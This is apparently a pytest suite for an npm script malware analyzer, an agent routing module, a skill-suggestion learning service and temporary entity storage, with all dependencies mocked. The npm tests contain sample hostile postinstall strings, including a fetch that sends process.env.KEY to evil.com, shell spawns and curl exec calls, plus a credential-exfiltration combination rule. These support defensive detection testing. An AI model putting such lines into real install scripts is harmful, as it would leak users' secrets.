"""
Coverage wave 66a — analyzer/storage modules (TDD, mocked deps, zero LLM
spend, no network, no real DB).

Covers (extending existing suites; the canonical ``core.*`` module paths were
never measured before this wave):

- core.npm_script_analyzer: analyze_package_scripts happy/error paths
  (postinstall/preinstall/install variants, unfetchable package, empty
  package list), suspicious-combination match/no-match, _parse_package_name
  scoped/versioned variants, _fetch_package_info success (dist-tags + first
  version fallback), no-versions/missing-latest/non-200/timeout/exception,
  analyze_scripts_from_content (lifecycle incl. prepack, non-lifecycle only,
  invalid JSON).
- core.dytopo_router: disabled+prior_state round math, <2 specialists,
  descriptor extraction failure, embedding batch failure, structured-response
  exception + non-dict response, similarity-matrix dimension mismatch +
  exception, visited-set edge skipping, out-degree adjacency dedup (the
  `dst_id in adjacency[src_id]` guard is unreachable — each dst appears at
  most once per source row — asserted defensively below).
- core.skill_suggestion_learning: record_feedback success (features provided
  / auto-extracted), invalid action, missing entity type, commit/refresh
  failures -> rollback, get_learned_patterns filtering (approval-rate +
  minimum-count thresholds), calculate_suggestion_quality (empty / average /
  commit failure), feature extraction + schema hash/similarity, service
  factory.
- core.temporary_entity_storage: model lifecycle methods (set_expiration
  default/custom, is_expired both ways, promote, reject, mark_migrated,
  mark_expired), table registration.

No real DB writes: sessions are fakes; npm registry access is mocked; the
real atom_dev.db is never touched.
"""

import json
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest

import core.dytopo_router as dytopo_module
import core.npm_script_analyzer as npm_mod
import core.skill_suggestion_learning as ssl_mod
import core.temporary_entity_storage as temp_mod
from core.dytopo_router import DyTopoRouter
from core.npm_script_analyzer import NpmScriptAnalyzer
from core.skill_suggestion_learning import (
    SkillSuggestionLearning,
    get_skill_suggestion_learning_service,
)
from core.temporary_entity_storage import TemporaryEntityNode, TemporaryEntityType


# ============================================================================
# core.npm_script_analyzer
# ============================================================================


def _npm_response(version_info, latest="1.0.0", versions=None):
    """Build a mock npm registry response object."""
    resp = MagicMock()
    resp.status_code = 200
    resp.json.return_value = {
        "dist-tags": {"latest": latest},
        "versions": versions if versions is not None else {latest: version_info},
    }
    return resp


class TestNpmScriptAnalyzer:
    def _analyzer(self):
        return NpmScriptAnalyzer()

    # -- analyze_package_scripts --------------------------------------------

    def test_analyze_package_without_lifecycle_scripts(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"test": "jest"}})) as mock_get:
            result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert result["malicious"] is False
        assert result["warnings"] == []
        assert result["scripts_found"] == []
        mock_get.assert_called_once_with("https://registry.npmjs.org/pkg", timeout=10)

    def test_analyze_safe_postinstall_adds_scripts_found(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"postinstall": "node postinstall.js"}})):
            result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert result["malicious"] is False
        assert result["scripts_found"] == [{
            "package": "pkg",
            "postinstall": True,
            "preinstall": False,
            "install": False,
            "content": "node postinstall.js",
        }]

    def test_analyze_malicious_fetch_detected(self):
        a = self._analyzer()
        script = "fetch('https://evil.com/exfil?d=' + process.env.KEY)"
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "evil", "scripts": {"postinstall": script}})):
            result = a.analyze_package_scripts(["evil@1.0.0"])
        assert result["malicious"] is True
        assert len(result["warnings"]) >= 2
        details = result["details"]
        assert any(d["pattern"] == r'\bfetch\s*\(' for d in details)
        assert all(d["severity"] == "CRITICAL" for d in details)
        assert all(d["script_type"] == "postinstall" for d in details)
        assert all(d["content"] == script for d in details)

    def test_analyze_preinstall_only_script_type(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"preinstall": "eval(code)"}})):
            result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert result["malicious"] is True
        assert all(d["script_type"] == "preinstall" for d in result["details"])
        assert result["scripts_found"][0]["preinstall"] is True

    def test_analyze_install_only_script_type(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"install": "spawn('sh')"}})):
            result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert result["malicious"] is True
        assert all(d["script_type"] == "install" for d in result["details"])
        assert result["scripts_found"][0]["install"] is True
        assert result["scripts_found"][0]["postinstall"] is False

    def test_analyze_content_truncated_at_200_chars(self):
        a = self._analyzer()
        long_script = "eval(" + "x" * 500 + ")"
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"postinstall": long_script}})):
            result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert all(len(d["content"]) == 200 for d in result["details"])

    def test_analyze_skips_unfetchable_package(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "scripts": {"postinstall": "fetch('http://e')"}})) as mock_get:
            mock_get.return_value = _npm_response({})
            mock_get.return_value.json.return_value = {"dist-tags": {}, "versions": {}}
            with patch.object(npm_mod.logger, "warning") as mock_warn:
                result = a.analyze_package_scripts(["pkg@1.0.0"])
        assert result["malicious"] is False
        assert result["scripts_found"] == []
        mock_warn.assert_called_once_with("Could not fetch package info for pkg")

    def test_analyze_empty_package_list(self):
        result = self._analyzer().analyze_package_scripts([])
        assert result == {
            "malicious": False,
            "warnings": [],
            "details": [],
            "scripts_found": [],
        }

    def test_suspicious_combination_matched(self):
        a = self._analyzer()
        responses = {}
        for pkg in ("trufflehog", "axios"):
            responses[pkg] = _npm_response({"name": pkg, "scripts": {}})

        def side_effect(url, timeout):
            for name, resp in responses.items():
                if url.endswith(f"/{name}"):
                    return resp
            raise AssertionError(f"unexpected url {url}")

        with patch.object(npm_mod.requests, "get", side_effect=side_effect):
            result = a.analyze_package_scripts(["trufflehog@1.0.0", "axios@1.0.0"])
        assert any("trufflehog, axios" in w for w in result["warnings"])
        combo = [d for d in result["details"] if d.get("type") == "suspicious_combination"]
        assert len(combo) == 1
        assert combo[0]["severity"] == "HIGH"
        assert combo[0]["reason"] == "Credential exfiltration"

    def test_suspicious_combination_not_matched(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "axios", "scripts": {}})):
            result = a.analyze_package_scripts(["axios@1.0.0"])
        assert not any(d.get("type") == "suspicious_combination" for d in result["details"])

    # -- _parse_package_name --------------------------------------------------

    def test_parse_package_name_all_variants(self):
        a = self._analyzer()
        assert a._parse_package_name("@angular/core@12.0.0") == "@angular/core"
        assert a._parse_package_name("@babel/preset-env") == "@babel/preset-env"
        assert a._parse_package_name("lodash@4.17.21") == "lodash"
        assert a._parse_package_name("express") == "express"

    # -- _fetch_package_info --------------------------------------------------

    def test_fetch_package_info_via_dist_tags(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", return_value=_npm_response(
            {"name": "pkg", "version": "1.0.0"})):
            info = a._fetch_package_info("pkg")
        assert info == {"name": "pkg", "version": "1.0.0"}

    def test_fetch_package_info_no_dist_tags_falls_back_to_first_version(self):
        a = self._analyzer()
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {"versions": {"0.1.0": {"name": "old"}}}
        with patch.object(npm_mod.requests, "get", return_value=resp):
            info = a._fetch_package_info("pkg")
        assert info == {"name": "old"}

    def test_fetch_package_info_no_versions_returns_none(self):
        a = self._analyzer()
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {"versions": {}}
        with patch.object(npm_mod.requests, "get", return_value=resp):
            assert a._fetch_package_info("pkg") is None

    def test_fetch_package_info_missing_latest_version_returns_empty(self):
        a = self._analyzer()
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {"dist-tags": {"latest": "9.9.9"}, "versions": {}}
        with patch.object(npm_mod.requests, "get", return_value=resp):
            assert a._fetch_package_info("pkg") == {}

    def test_fetch_package_info_non_200_returns_none(self):
        a = self._analyzer()
        resp = MagicMock()
        resp.status_code = 404
        with patch.object(npm_mod.requests, "get", return_value=resp) as mock_get, \
                patch.object(npm_mod.logger, "error") as mock_err:
            assert a._fetch_package_info("missing") is None
        mock_err.assert_called_once_with("npm registry returned 404 for missing")

    def test_fetch_package_info_timeout_returns_none(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get",
                          side_effect=npm_mod.requests.exceptions.Timeout()) as mock_get, \
                patch.object(npm_mod.logger, "error") as mock_err:
            assert a._fetch_package_info("slow") is None
        assert "timed out" in mock_err.call_args[0][0]

    def test_fetch_package_info_generic_exception_returns_none(self):
        a = self._analyzer()
        with patch.object(npm_mod.requests, "get", side_effect=OSError("dns")) as mock_get, \
                patch.object(npm_mod.logger, "error") as mock_err:
            assert a._fetch_package_info("broken") is None
        assert "Error fetching package info" in mock_err.call_args[0][0]

    # -- analyze_scripts_from_content ------------------------------------------

    def test_analyze_content_lifecycle_scripts_detected(self):
        a = self._analyzer()
        content = json.dumps({
            "name": "pkg",
            "scripts": {
                "postinstall": "exec('curl evil')",
                "prepack": "fetch('https://evil.com')",
                "test": "jest",
            },
        })
        result = a.analyze_scripts_from_content(content)
        assert result["malicious"] is True
        assert {s["type"] for s in result["scripts_found"]} == {"postinstall", "prepack"}
        assert len(result["details"]) >= 2

    def test_analyze_content_only_non_lifecycle_scripts(self):
        a = self._analyzer()
        content = json.dumps({"name": "pkg", "scripts": {"test": "jest", "build": "tsc"}})
        result = a.analyze_scripts_from_content(content)
        assert result["malicious"] is False
        assert result["warnings"] == []
        assert result["scripts_found"] == []

    def test_analyze_content_clean_lifecycle_script(self):
        a = self._analyzer()
        content = json.dumps({"name": "pkg", "scripts": {"install": "node setup.js"}})
        result = a.analyze_scripts_from_content(content)
        assert result["malicious"] is False
        assert result["scripts_found"] == [{"type": "install", "content": "node setup.js"}]

    def test_analyze_content_invalid_json(self):
        a = self._analyzer()
        with patch.object(npm_mod.logger, "error") as mock_err:
            result = a.analyze_scripts_from_content("{not json")
        assert result == {
            "malicious": False,
            "warnings": ["Failed to parse package.json"],
            "details": [],
            "scripts_found": [],
        }
        mock_err.assert_called_once()


# ============================================================================
# core.dytopo_router
# ============================================================================


class _NoIdAgent(SimpleNamespace):
    """Specialist without an ``id`` attribute (covers getattr fallbacks)."""


class TestDyTopoRouter:
    @pytest.fixture
    def llm(self):
        llm = Mock()
        llm.generate_embeddings_batch = AsyncMock(return_value=[[1.0], [1.0]])
        llm.generate_structured_response = AsyncMock(
            return_value={"query_need": "need", "key_offer": "offer"}
        )
        return llm

    @pytest.fixture
    def router(self, llm, monkeypatch):
        monkeypatch.setattr(dytopo_module, "DYTOPO_ROUTING_ENABLED", True)
        return DyTopoRouter(db=Mock(), llm=llm)

    @staticmethod
    def _agent(agent_id):
        a = Mock()
        a.id = agent_id
        return a

    # -- flag / early returns -----------------------------------------------

    async def test_disabled_with_prior_state_increments_round(self, llm, monkeypatch):
        monkeypatch.setattr(dytopo_module, "DYTOPO_ROUTING_ENABLED", False)
        r = DyTopoRouter(db=Mock(), llm=llm)
        result = await r.compute_round_topology(
            execution_id="e", specialists=[], prior_state={"round": 3}
        )
        assert result == {
            "adjacency": {},
            "round": 4,
            "embeddings_cached": False,
            "enabled": False,
        }

    async def test_enabled_round_increments_from_prior_state(self, router):
        result = await router.compute_round_topology(
            execution_id="e", specialists=[], prior_state={"round": 2}
        )
        assert result["round"] == 3
        assert result["enabled"] is True

    async def test_single_specialist_returns_empty_adjacency(self, router):
        result = await router.compute_round_topology(
            execution_id="e", specialists=[self._agent("A")], prior_state=None
        )
        assert result == {
            "adjacency": {},
            "round": 1,
            "embeddings_cached": False,
            "enabled": True,
        }

    # -- descriptor extraction failure ---------------------------------------

    async def test_descriptor_extraction_failure_falls_back_to_empty(self, router):
        async def boom(agent, observation):
            raise RuntimeError("llm down")

        router.extract_descriptor = boom
        result = await router.compute_round_topology(
            execution_id="e", specialists=[_NoIdAgent(), _NoIdAgent()], prior_state=None
        )
        assert result["enabled"] is True
        assert result["embeddings_cached"] is True
        assert set(result["adjacency"].keys()) == {"0", "1"}

    async def test_extract_descriptor_structured_response_exception(self, router, llm):
        llm.generate_structured_response = AsyncMock(side_effect=RuntimeError("boom"))
        q, k = await router.extract_descriptor(self._agent("A"), {})
        assert (q, k) == ("", "")

    async def test_extract_descriptor_non_dict_response_returns_empty(self, router, llm):
        llm.generate_structured_response = AsyncMock(return_value="not a dict")
        q, k = await router.extract_descriptor(self._agent("A"), {})
        assert (q, k) == ("", "")

    async def test_extract_descriptor_empty_dict_values(self, router, llm):
        llm.generate_structured_response = AsyncMock(
            return_value={"query_need": None, "key_offer": "  "}
        )
        q, k = await router.extract_descriptor(self._agent("A"), {})
        assert (q, k) == ("", "")

    # -- embedding failure ---------------------------------------------------

    async def test_embedding_batch_failure_returns_empty(self, router, llm):
        llm.generate_embeddings_batch = AsyncMock(side_effect=RuntimeError("no embeddings"))
        result = await router.compute_round_topology(
            execution_id="e", specialists=[self._agent("A"), self._agent("B")],
            prior_state=None,
        )
        assert result["adjacency"] == {}
        assert result["embeddings_cached"] is False
        assert result["enabled"] is True

    # -- similarity matrix ---------------------------------------------------

    def test_similarity_matrix_dimension_mismatch_returns_zeros(self, router):
        sim = router._similarity_matrix([[1.0, 2.0], [3.0, 4.0]], [[5.0]])
        assert sim == [[0.0], [0.0]]

    def test_similarity_matrix_non_2d_returns_zeros(self, router):
        sim = router._similarity_matrix([1.0, 2.0], [3.0, 4.0])
        assert sim == [[0.0, 0.0], [0.0, 0.0]]

    def test_similarity_matrix_numpy_error_returns_zeros(self, router):
        with patch.object(dytopo_module.np, "linalg") as linalg_mock:
            linalg_mock.norm.side_effect = ValueError("bad input")
            sim = router._similarity_matrix([[1.0]], [[1.0]])
        assert sim == [[0.0]]

    def test_similarity_matrix_cosine_values(self, router):
        sim = router._similarity_matrix([[1.0, 0.0]], [[1.0, 0.0]])
        assert abs(sim[0][0] - 1.0) < 1e-9

    # -- gating: visited / dedup ---------------------------------------------

    async def test_visited_set_edges_skipped(self, router):
        router._visited["e"] = {"B"}
        result = await router.compute_round_topology(
            execution_id="e", specialists=[self._agent("A"), self._agent("B"),
                                           self._agent("C")],
            prior_state=None,
        )
        adjacency = result["adjacency"]
        assert "B" not in adjacency["A"]
        assert "B" not in adjacency["C"]

    def test_gate_edges_no_duplicates_in_adjacency(self, router):
        """Defensive check: the `dst_id in adjacency[src_id]` guard is
        unreachable (each dst index appears at most once per source row in the
        ranked list) but a duplicate would never be appended anyway."""
        sim = [[1.0, 1.0], [1.0, 1.0]]
        out = router._gate_edges(sim, threshold=0.5, agent_ids=["A", "B"],
                                 visited=set(), max_out_degree=3)
        for dsts in out.values():
            assert len(dsts) == len(set(dsts))

    def test_gate_edges_visited_skip_direct(self, router):
        sim = [[1.0, 1.0, 1.0]]
        out = router._gate_edges(sim, threshold=0.5, agent_ids=["A", "B", "C"],
                                 visited={"B"}, max_out_degree=3)
        assert out["A"] == ["C"]

    def test_gate_edges_breaks_at_out_degree_cap(self, router):
        """A source with more candidates than the cap hits the break guard."""
        sim = [[1.0] * 5] + [[1.0] * 5 for _ in range(4)]
        out = router._gate_edges(sim, threshold=0.5,
                                 agent_ids=["A", "B", "C", "D", "E"],
                                 visited=set(), max_out_degree=2)
        assert all(len(dsts) == 2 for dsts in out.values())

    def test_gate_edges_dedup_guard_with_colliding_agent_ids(self, router):
        """The `dst_id in adjacency[src_id]` guard only triggers when two
        specialists share the same id — reachable only via id collision."""
        sim = [[1.0, 1.0, 1.0], [1.0, 1.0, 1.0], [1.0, 1.0, 1.0]]
        out = router._gate_edges(sim, threshold=0.5, agent_ids=["A", "A", "B"],
                                 visited=set(), max_out_degree=3)
        assert out["A"] == ["A", "B"]
        assert out["B"] == ["A"]


# ============================================================================
# core.skill_suggestion_learning
# ============================================================================


class _FakeDBSessionCM:
    """Stand-in for the get_db_session() context manager."""

    def __init__(self, session):
        self._session = session

    def __enter__(self):
        return self._session

    def __exit__(self, *exc):
        return False


def _fake_session(entity_type=None, feedback_records=None):
    session = MagicMock()
    session.query.return_value.filter.return_value.first.return_value = entity_type
    session.query.return_value.filter.return_value.all.return_value = feedback_records or []
    return session


def _fake_feedback(**overrides):
    d = {
        "schema_hash": "h1",
        "skill_id": "s1",
        "action": "approved",
        "schema_features": {"properties": ["a"], "property_count": 1},
        "usage_count": 0,
        "suggestion_quality": None,
    }
    d.update(overrides)
    return SimpleNamespace(**d)


class TestSkillSuggestionLearning:
    @pytest.fixture
    def service(self):
        return SkillSuggestionLearning(db=MagicMock())

    def test_init_stores_db_and_entity_skill_service(self):
        db = MagicMock()
        svc = SkillSuggestionLearning(db=db)
        assert svc.db is db
        assert svc.entity_skill_service.db is db

    # -- record_feedback -----------------------------------------------------

    def test_record_feedback_success_with_provided_features(self, service):
        entity = SimpleNamespace(id="et1", json_schema={"properties": {"a": {}}})
        session = _fake_session(entity_type=entity)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            feedback = service.record_feedback(
                tenant_id="t1", entity_type_id="et1", skill_id="s1",
                action="approved", confidence_score=0.9,
                schema_features={"properties": ["x"], "property_count": 1},
            )
        assert feedback.tenant_id == "t1"
        assert feedback.action == "approved"
        assert feedback.confidence_score == 0.9
        assert feedback.schema_features == {"properties": ["x"], "property_count": 1}
        session.add.assert_called_once_with(feedback)
        session.commit.assert_called_once()
        session.refresh.assert_called_once_with(feedback)

    def test_record_feedback_extracts_features_when_missing(self, service):
        entity = SimpleNamespace(id="et1", json_schema={"properties": {"a": {}, "b": {}}})
        session = _fake_session(entity_type=entity)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            feedback = service.record_feedback(
                tenant_id="t1", entity_type_id="et1", skill_id="s1", action="dismissed"
            )
        assert feedback.schema_features == {"properties": ["a", "b"], "property_count": 2}
        assert feedback.schema_hash == service._calculate_schema_hash(
            entity.json_schema
        )
        assert feedback.action == "dismissed"

    def test_record_feedback_invalid_action_raises(self, service):
        session = _fake_session()
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            with pytest.raises(ValueError, match="Invalid action"):
                service.record_feedback("t1", "et1", "s1", "maybe")

    def test_record_feedback_entity_type_not_found_raises(self, service):
        session = _fake_session(entity_type=None)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            with pytest.raises(ValueError, match="not found"):
                service.record_feedback("t1", "nope", "s1", "approved")

    def test_record_feedback_commit_failure_rolls_back(self, service):
        entity = SimpleNamespace(id="et1", json_schema={})
        session = _fake_session(entity_type=entity)
        session.commit.side_effect = RuntimeError("db full")
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            with pytest.raises(RuntimeError):
                service.record_feedback("t1", "et1", "s1", "approved")
        session.rollback.assert_called_once()

    def test_record_feedback_refresh_failure_rolls_back(self, service):
        entity = SimpleNamespace(id="et1", json_schema={})
        session = _fake_session(entity_type=entity)
        session.refresh.side_effect = RuntimeError("refresh failed")
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            with pytest.raises(RuntimeError):
                service.record_feedback("t1", "et1", "s1", "approved")
        session.rollback.assert_called_once()

    # -- get_learned_patterns --------------------------------------------------

    def test_get_learned_patterns_empty(self, service):
        session = _fake_session(feedback_records=[])
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            assert service.get_learned_patterns("t1") == []

    def test_get_learned_patterns_includes_high_confidence(self, service):
        records = [
            _fake_feedback(schema_hash="h1", skill_id="s1", action="approved"),
            _fake_feedback(schema_hash="h1", skill_id="s1", action="approved"),
        ]
        session = _fake_session(feedback_records=records)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            patterns = service.get_learned_patterns("t1")
        assert len(patterns) == 1
        p = patterns[0]
        assert p["schema_hash"] == "h1"
        assert p["skill_id"] == "s1"
        assert p["approval_rate"] == 1.0
        assert p["count"] == 2

    def test_get_learned_patterns_excludes_low_approval_rate(self, service):
        records = [
            _fake_feedback(schema_hash="h2", skill_id="s1", action="approved"),
            _fake_feedback(schema_hash="h2", skill_id="s1", action="rejected"),
        ]
        session = _fake_session(feedback_records=records)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            assert service.get_learned_patterns("t1") == []
            low_bar = service.get_learned_patterns("t1", min_confidence=0.4)
        assert len(low_bar) == 1
        assert low_bar[0]["approval_rate"] == 0.5

    def test_get_learned_patterns_excludes_low_count(self, service):
        records = [_fake_feedback(schema_hash="h3", skill_id="s1", action="approved")]
        session = _fake_session(feedback_records=records)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            assert service.get_learned_patterns("t1") == []

    def test_get_learned_patterns_separates_distinct_hashes(self, service):
        records = [
            _fake_feedback(schema_hash="h1", skill_id="s1", action="approved"),
            _fake_feedback(schema_hash="h1", skill_id="s1", action="approved"),
            _fake_feedback(schema_hash="h2", skill_id="s2", action="approved"),
            _fake_feedback(schema_hash="h2", skill_id="s2", action="approved"),
        ]
        session = _fake_session(feedback_records=records)
        with patch.object(ssl_mod, "get_db_session", return_value=_FakeDBSessionCM(session)):
            patterns = service.get_learned_patterns("t1")
        assert {p["schema_hash"] for p in patterns} == {"h1", "h2"}

    # -- calculate_suggestion_quality -----------------------------------------

    def test_calculate_suggestion_quality_no_records(self, service):
        session = _fake_session(feedback_records=[])
        assert service.calculate_suggestion_quality("s1", session) is None

    def test_calculate_suggestion_quality_average(self, service):
        fb = _fake_feedback(schema_hash="h1", action="approved", usage_count=3)
        fb2 = _fake_feedback(schema_hash="h1", action="rejected", usage_count=1)
        session = _fake_session(feedback_records=[fb, fb2])
        quality = service.calculate_suggestion_quality("s1", session)
        expected = 0.5 * ((3 + 1) ** 0.5 / 10.0)
        expected += 0.5 * ((1 + 1) ** 0.5 / 10.0)
        assert quality == pytest.approx(expected / 2)
        assert fb.suggestion_quality == pytest.approx(0.5 * (4 ** 0.5 / 10.0))
        assert fb2.suggestion_quality == pytest.approx(0.5 * (2 ** 0.5 / 10.0))
        session.commit.assert_called_once()

    def test_calculate_suggestion_quality_commit_failure(self, service):
        fb = _fake_feedback()
        session = _fake_session(feedback_records=[fb])
        session.commit.side_effect = RuntimeError("commit failed")
        assert service.calculate_suggestion_quality("s1", session) is None
        session.rollback.assert_called_once()

    # -- helpers ---------------------------------------------------------------

    def test_extract_schema_features(self, service):
        assert service._extract_schema_features(
            {"properties": {"a": {}, "b": {}, "c": {}}}
        ) == {"properties": ["a", "b", "c"], "property_count": 3}
        assert service._extract_schema_features({}) == {
            "properties": [], "property_count": 0
        }

    def test_calculate_schema_hash_deterministic(self, service):
        schema = {"properties": {"b": {}, "a": {}}}
        assert service._calculate_schema_hash(schema) == service._calculate_schema_hash(
            {"properties": {"a": {}, "b": {}}}
        )
        assert len(service._calculate_schema_hash(schema)) == 64

    def test_calculate_schema_similarity(self, service):
        assert service._calculate_schema_similarity({}, {}) == 1.0
        assert service._calculate_schema_similarity(
            {"properties": ["a", "b"]}, {"properties": ["b", "c"]}
        ) == pytest.approx(1 / 3)
        assert service._calculate_schema_similarity(
            {"properties": ["a"]}, {"properties": ["b"]}
        ) == 0.0

    # -- factory ---------------------------------------------------------------

    def test_factory_creates_service(self):
        svc = get_skill_suggestion_learning_service(db="db")
        assert isinstance(svc, SkillSuggestionLearning)
        assert svc.db == "db"
        assert isinstance(get_skill_suggestion_learning_service(), SkillSuggestionLearning)


# ============================================================================
# core.temporary_entity_storage
# ============================================================================


class TestTemporaryEntityType:
    def _entity_type(self, **overrides):
        d = {
            "id": "tt1",
            "tenant_id": "t1",
            "slug": "customer",
            "display_name": "Customer",
            "json_schema": {"properties": {}},
            "expires_at": datetime.now(timezone.utc) + timedelta(hours=1),
        }
        d.update(overrides)
        return TemporaryEntityType(**d)

    def test_table_names_registered(self):
        assert "temporary_entity_types" in temp_mod.Base.metadata.tables
        assert "temporary_entity_nodes" in temp_mod.Base.metadata.tables

    def test_columns_defaults(self):
        t = self._entity_type()
        assert t.expires_at is not None
        cols = TemporaryEntityType.__table__.c
        assert cols.status.default.arg == "draft"
        assert cols.sample_count.default.arg == 0

    def test_set_expiration_default_ttl(self):
        t = self._entity_type()
        t.set_expiration()
        delta = t.expires_at - datetime.now(timezone.utc)
        assert timedelta(hours=47) < delta < timedelta(hours=49)

    def test_set_expiration_custom_ttl(self):
        t = self._entity_type()
        t.set_expiration(ttl_hours=12)
        delta = t.expires_at - datetime.now(timezone.utc)
        assert timedelta(hours=11) < delta < timedelta(hours=13)

    def test_is_expired_future_not_expired(self):
        t = self._entity_type()
        assert t.is_expired() is False

    def test_is_expired_past(self):
        t = self._entity_type(expires_at=datetime.now(timezone.utc) - timedelta(hours=1))
        assert t.is_expired() is True

    def test_promote(self):
        t = self._entity_type()
        t.promote("ed1")
        assert t.status == "promoted"
        assert t.promoted_to_id == "ed1"
        assert t.promoted_at is not None

    def test_reject(self):
        t = self._entity_type()
        t.reject("low quality")
        assert t.status == "rejected"
        assert t.rejection_reason == "low quality"
        delta = t.expires_at - datetime.now(timezone.utc)
        assert timedelta(hours=0) < delta < timedelta(hours=2)

    def test_reject_custom_ttl(self):
        t = self._entity_type()
        t.reject("spam", ttl_hours=6)
        delta = t.expires_at - datetime.now(timezone.utc)
        assert timedelta(hours=5) < delta < timedelta(hours=7)


class TestTemporaryEntityNode:
    def _node(self, **overrides):
        d = {
            "id": "tn1",
            "tenant_id": "t1",
            "workspace_id": "w1",
            "temporary_type_id": "tt1",
            "name": "Acme",
            "type": "customer",
        }
        d.update(overrides)
        return TemporaryEntityNode(**d)

    def test_defaults(self):
        n = self._node()
        assert TemporaryEntityNode.__table__.c.status.default.arg == "pending"
        assert TemporaryEntityNode.__table__.c.properties.default.arg == {}

    def test_mark_migrated(self):
        n = self._node()
        n.mark_migrated("gn1")
        assert n.status == "migrated"
        assert n.migrated_to_id == "gn1"
        assert n.migrated_at is not None

    def test_mark_expired(self):
        n = self._node()
        n.mark_expired()
        assert n.status == "expired"
